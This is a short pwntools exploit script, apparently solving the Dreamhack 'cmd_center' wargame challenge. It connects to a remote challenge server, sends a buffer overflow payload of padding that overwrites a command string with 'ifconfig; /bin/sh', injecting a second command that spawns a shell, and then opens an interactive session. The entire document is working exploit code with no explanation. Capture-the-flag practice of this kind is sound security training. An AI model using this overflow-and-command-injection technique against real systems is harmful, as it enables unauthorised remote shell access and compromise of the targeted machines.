from pwn import *

# p = process("./cmd_center")
p = remote("host3.dreamhack.games", 23625)

payload = b"A" * 24
payload += b"A" * 8
payload += b"ifconfig"
payload += b"; /bin/sh"
p.recvuntil("Center name: ")
p.send(payload)

p.interactive()

